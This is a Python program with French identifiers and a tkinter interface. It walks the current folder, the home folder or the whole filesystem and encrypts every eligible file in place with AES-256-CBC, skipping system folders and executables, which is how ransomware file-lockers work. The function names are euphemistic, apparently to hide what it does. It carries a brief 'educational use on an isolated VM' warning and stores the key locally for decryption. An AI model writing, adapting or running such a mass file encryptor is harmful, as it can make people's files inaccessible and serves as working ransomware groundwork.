import os
import sys
import json
import time
import base64
import random
import string
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
import tkinter as tk
from tkinter import messagebox, simpledialog

class GestionnaireSecuriteAvance:
    def __init__(self):
        self.taille_cle = 32  # 256 bits pour AES-256
        self.taille_iv = 16   # 128 bits pour le vecteur d'initialisation
        self.element_secret = None
        self.fichiers_traites = 0
        self.dossiers_parcourus = 0
        self.erreurs = 0
        self.timestamp = int(time.time())
        self.marqueur_aleatoire = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        self.chemin_log = f"securite_{self.marqueur_aleatoire}_{self.timestamp}.json"
        
        # Liste des dossiers √† exclure pour √©viter d'endommager le syst√®me
        self.dossiers_exclus = [
            '/proc', '/sys', '/dev', '/run', '/mnt',
            '/media', '/var/lib/docker', '/tmp', '/var/tmp',
            '/boot', '/usr/bin', '/bin', '/sbin', '/usr/sbin',
            '/var/log', '/etc', '/lib', '/lib64'
        ]
        
    def obtenir_element_aleatoire(self):
        """G√©n√®re une cl√© cryptographique al√©atoire"""
        return get_random_bytes(self.taille_cle)
    
    def creer_transformation(self, element_secret, donnees):
        """Chiffre les donn√©es avec AES-CBC"""
        element_init = get_random_bytes(self.taille_iv)
        transformateur = AES.new(element_secret, AES.MODE_CBC, element_init)
        donnees_ajustees = pad(donnees, AES.block_size)
        resultat = transformateur.encrypt(donnees_ajustees)
        return element_init + resultat  # Concat√©ner IV et donn√©es chiffr√©es
    
    def inverser_transformation(self, element_secret, donnees_transformees):
        """D√©chiffre les donn√©es avec AES-CBC"""
        if len(donnees_transformees) < self.taille_iv:
            raise ValueError("Donn√©es trop courtes pour contenir un vecteur d'initialisation")
            
        element_init = donnees_transformees[:self.taille_iv]
        donnees_chiffrees = donnees_transformees[self.taille_iv:]
        
        transformateur = AES.new(element_secret, AES.MODE_CBC, element_init)
        try:
            donnees_originales = unpad(transformateur.decrypt(donnees_chiffrees), AES.block_size)
            return donnees_originales
        except ValueError as e:
            raise ValueError(f"√âchec du d√©chiffrement: {e}")
    
    def traiter_document(self, chemin_acces, element_secret, mode="chiffrer"):
        """Traite un fichier (chiffrement ou d√©chiffrement)"""
        try:
            # V√©rifier si le fichier est accessible en lecture/√©criture
            if not os.access(chemin_acces, os.R_OK | os.W_OK):
                return False
                
            with open(chemin_acces, 'rb') as document:
                contenu = document.read()
            
            if mode == "chiffrer":
                contenu_transforme = self.creer_transformation(element_secret, contenu)
            elif mode == "dechiffrer":
                contenu_transforme = self.inverser_transformation(element_secret, contenu)
            else:
                raise ValueError(f"Mode inconnu: {mode}")
            
            # √âcriture atomique pour √©viter la corruption en cas d'interruption
            chemin_temp = f"{chemin_acces}.{self.marqueur_aleatoire}.temp"
            with open(chemin_temp, 'wb') as document_temp:
                document_temp.write(contenu_transforme)
                document_temp.flush()
                os.fsync(document_temp.fileno())
            
            os.replace(chemin_temp, chemin_acces)
            
            self.fichiers_traites += 1
            if self.fichiers_traites % 50 == 0:
                print(f"Progression: {self.fichiers_traites} fichiers trait√©s, {self.dossiers_parcourus} dossiers parcourus")
            
            return True
        except Exception as erreur:
            self.erreurs += 1
            print(f"Probl√®me avec '{chemin_acces}': {erreur}")
            return False
    
    def doit_exclure(self, chemin):
        """D√©termine si un chemin doit √™tre exclu du traitement"""
        # V√©rifier si le chemin est dans la liste des dossiers exclus
        for exclu in self.dossiers_exclus:
            if chemin.startswith(exclu):
                return True
        
        # Ne pas toucher aux fichiers syst√®me critiques ou cach√©s
        basename = os.path.basename(chemin)
        if basename.startswith('.'):
            # Autoriser certains fichiers cach√©s comme .txt, .jpg, etc.
            extension = os.path.splitext(basename)[1].lower()
            if extension not in ['.txt', '.jpg', '.jpeg', '.png', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.mp3', '.mp4']:
                return True
                
        # Exclure fichiers syst√®me et ex√©cutables
        if basename.endswith(('.sys', '.dll', '.so', '.exe', '.bin', '.ko')):
            return True
            
        # Exclure notre propre fichier de log
        if basename == self.chemin_log:
            return True
            
        return False
    
    def parcourir_et_traiter(self, dossier_racine, element_secret, mode="chiffrer"):
        """Parcourt r√©cursivement un dossier et traite tous les fichiers √©ligibles"""
        try:
            for root, dirs, files in os.walk(dossier_racine, topdown=True):
                # Modifier dirs en place pour √©viter de parcourir les dossiers exclus
                dirs[:] = [d for d in dirs if not self.doit_exclure(os.path.join(root, d))]
                
                self.dossiers_parcourus += 1
                for fichier in files:
                    chemin_complet = os.path.join(root, fichier)
                    if not self.doit_exclure(chemin_complet) and os.path.isfile(chemin_complet):
                        self.traiter_document(chemin_complet, element_secret, mode)
                        
        except Exception as e:
            print(f"Erreur lors du parcours de {dossier_racine}: {e}")
    
    def sauvegarder_information(self, element_secret, mode="chiffrer"):
        """Sauvegarde les informations n√©cessaires pour le d√©chiffrement ult√©rieur"""
        info = {
            "cle_hex": element_secret.hex(),
            "timestamp": self.timestamp,
            "marqueur": self.marqueur_aleatoire,
            "mode": mode,
            "fichiers_traites": self.fichiers_traites,
            "dossiers_parcourus": self.dossiers_parcourus,
            "erreurs": self.erreurs
        }
        
        try:
            with open(self.chemin_log, 'w') as f:
                json.dump(info, f, indent=4)
            print(f"Informations de s√©curit√© sauvegard√©es dans {self.chemin_log}")
            
            # Cr√©er une copie de sauvegarde dans le dossier utilisateur
            chemin_home = os.path.expanduser("~")
            chemin_backup = os.path.join(chemin_home, f"securite_backup_{self.marqueur_aleatoire}.json")
            with open(chemin_backup, 'w') as f:
                json.dump(info, f, indent=4)
            print(f"Copie de sauvegarde cr√©√©e dans {chemin_backup}")
            
            return True
        except Exception as e:
            print(f"CRITIQUE: Impossible de sauvegarder les informations: {e}")
            print(f"SAUVEGARDEZ IMM√âDIATEMENT CETTE CL√â: {element_secret.hex()}")
            return False


class OperationSecurite:
    def __init__(self):
        self.gestionnaire = GestionnaireSecuriteAvance()
    
    def afficher_avertissement(self):
        """Affiche un avertissement avant de proc√©der √† l'op√©ration"""
        fenetre = tk.Tk()
        fenetre.withdraw()
        
        reponse = messagebox.askokcancel(
            "‚ö†Ô∏è AVERTISSEMENT - OP√âRATION CRITIQUE ‚ö†Ô∏è", 
            "ATTENTION: Cette op√©ration va traiter des fichiers sur votre syst√®me.\n\n" +
            "Ceci est destin√© UNIQUEMENT √† des fins √©ducatives sur une machine virtuelle isol√©e.\n\n" +
            "Continuer peut rendre vos fichiers inaccessibles sans la cl√© de d√©chiffrement.\n\n" +
            "√ätes-vous certain de vouloir continuer?"
        )
        
        return reponse
    
    def mode_chiffrement(self):
        """Ex√©cute le mode de chiffrement"""
        # G√©n√©ration de la cl√©
        element_secret = self.gestionnaire.obtenir_element_aleatoire()
        
        # Interface utilisateur
        fenetre = tk.Tk()
        fenetre.withdraw()
        
        # Afficher la cl√©
        cle_hex = element_secret.hex()
        messagebox.showinfo(
            "üîë CL√â DE S√âCURIT√â - IMPORTANT üîë", 
            f"CONSERVEZ CETTE CL√â EN LIEU S√õR:\n\n{cle_hex}\n\n" +
            "Sans cette cl√©, vous ne pourrez pas r√©cup√©rer vos fichiers.\n" +
            "Elle sera √©galement sauvegard√©e dans des fichiers JSON."
        )
        
        # S√©lection du dossier racine
        options = [
            "R√©pertoire courant (uniquement)",
            "R√©pertoire utilisateur (recommand√© pour test)",
            "Syst√®me entier (tr√®s risqu√©)"
        ]
        
        choix = simpledialog.askinteger(
            "S√©lection du p√©rim√®tre",
            "S√©lectionnez le p√©rim√®tre de l'op√©ration:\n\n" +
            "1: R√©pertoire courant uniquement\n" +
            "2: R√©pertoire utilisateur (recommand√© pour test)\n" +
            "3: Syst√®me entier (tr√®s risqu√©)\n",
            minvalue=1, maxvalue=3
        )
        
        if not choix:
            print("Op√©ration annul√©e par l'utilisateur.")
            return False
            
        if choix == 1:
            racine = os.getcwd()
        elif choix == 2:
            racine = os.path.expanduser("~")
        else:
            racine = "/"
            
        print(f"D√©but du chiffrement √† partir de: {racine}")
        
        # Ex√©cution du chiffrement
        self.gestionnaire.parcourir_et_traiter(racine, element_secret, "chiffrer")
        
        # Sauvegarde des informations
        self.gestionnaire.sauvegarder_information(element_secret, "chiffrer")
        
        # Rapport final
        messagebox.showinfo(
            "Op√©ration termin√©e", 
            f"Statistiques:\n" +
            f"- {self.gestionnaire.fichiers_traites} fichiers trait√©s\n" +
            f"- {self.gestionnaire.dossiers_parcourus} dossiers parcourus\n" +
            f"- {self.gestionnaire.erreurs} erreurs rencontr√©es\n\n" +
            f"La cl√© a √©t√© sauvegard√©e dans {self.gestionnaire.chemin_log}"
        )
        
        return True
    
    def mode_dechiffrement(self):
        """Ex√©cute le mode de d√©chiffrement"""
        fenetre = tk.Tk()
        fenetre.withdraw()
        
        # Demander la m√©thode de chargement de la cl√©
        choix = messagebox.askquestion(
            "Chargement de la cl√©",
            "Avez-vous un fichier JSON contenant la cl√© de d√©chiffrement?"
        )
        
        element_secret = None
        
        if choix == 'yes':
            # Demander le chemin du fichier JSON
            chemin_fichier = simpledialog.askstring(
                "Chemin du fichier",
                "Entrez le chemin complet du fichier JSON:"
            )
            
            if not chemin_fichier:
                print("Op√©ration annul√©e par l'utilisateur.")
                return False
                
            try:
                with open(chemin_fichier, 'r') as f:
                    donnees = json.load(f)
                    if 'cle_hex' in donnees:
                        element_secret = bytes.fromhex(donnees['cle_hex'])
                        print(f"Cl√© charg√©e depuis {chemin_fichier}")
                    else:
                        messagebox.showerror(
                            "Erreur",
                            "Format de fichier de cl√© invalide."
                        )
                        return False
            except Exception as e:
                messagebox.showerror(
                    "Erreur",
                    f"Impossible de charger la cl√© depuis le fichier: {e}"
                )
                return False
        else:
            # Demander la cl√© directement
            cle_hex = simpledialog.askstring(
                "Cl√© de d√©chiffrement",
                "Entrez la cl√© de d√©chiffrement (format hexad√©cimal):"
            )
            
            if not cle_hex:
                print("Op√©ration annul√©e par l'utilisateur.")
                return False
                
            try:
                element_secret = bytes.fromhex(cle_hex)
                print("Cl√© charg√©e avec succ√®s.")
            except Exception as e:
                messagebox.showerror(
                    "Erreur",
                    f"Format de cl√© invalide: {e}"
                )
                return False
        
        # S√©lection du dossier racine
        options = [
            "R√©pertoire courant (uniquement)",
            "R√©pertoire utilisateur",
            "Syst√®me entier"
        ]
        
        choix = simpledialog.askinteger(
            "S√©lection du p√©rim√®tre",
            "S√©lectionnez le p√©rim√®tre de l'op√©ration:\n\n" +
            "1: R√©pertoire courant uniquement\n" +
            "2: R√©pertoire utilisateur\n" +
            "3: Syst√®me entier\n",
            minvalue=1, maxvalue=3
        )
        
        if not choix:
            print("Op√©ration annul√©e par l'utilisateur.")
            return False
            
        if choix == 1:
            racine = os.getcwd()
        elif choix == 2:
            racine = os.path.expanduser("~")
        else:
            racine = "/"
            
        print(f"D√©but du d√©chiffrement √† partir de: {racine}")
        
        # Confirmation avant de d√©marrer
        confirmation = messagebox.askokcancel(
            "Confirmation",
            f"Vous √™tes sur le point de d√©chiffrer les fichiers dans:\n{racine}\n\n" +
            "Cette op√©ration est irr√©versible. Voulez-vous continuer?"
        )
        
        if not confirmation:
            print("Op√©ration annul√©e par l'utilisateur.")
            return False
        
        # Ex√©cution du d√©chiffrement
        self.gestionnaire.parcourir_et_traiter(racine, element_secret, "dechiffrer")
        
        # Rapport final
        messagebox.showinfo(
            "Op√©ration termin√©e", 
            f"Statistiques:\n" +
            f"- {self.gestionnaire.fichiers_traites} fichiers trait√©s\n" +
            f"- {self.gestionnaire.dossiers_parcourus} dossiers parcourus\n" +
            f"- {self.gestionnaire.erreurs} erreurs rencontr√©es"
        )
        
        return True
    

def main():
    operation = OperationSecurite()
    
    # Interface principale
    fenetre = tk.Tk()
    fenetre.title("Gestionnaire de S√©curit√©")
    fenetre.geometry("400x200")
    
    tk.Label(fenetre, text="S√©lectionnez une op√©ration:", font=("Arial", 14)).pack(pady=20)
    
    def lancer_chiffrement():
        fenetre.withdraw()
        if operation.afficher_avertissement():
            operation.mode_chiffrement()
        fenetre.destroy()
    
    def lancer_dechiffrement():
        fenetre.withdraw()
        operation.mode_dechiffrement()
        fenetre.destroy()
    
    tk.Button(fenetre, text="Chiffrer", command=lancer_chiffrement, width=20, height=2).pack(pady=10)
    tk.Button(fenetre, text="D√©chiffrer", command=lancer_dechiffrement, width=20, height=2).pack(pady=10)
    
    fenetre.mainloop()

if __name__ == "__main__":
    main()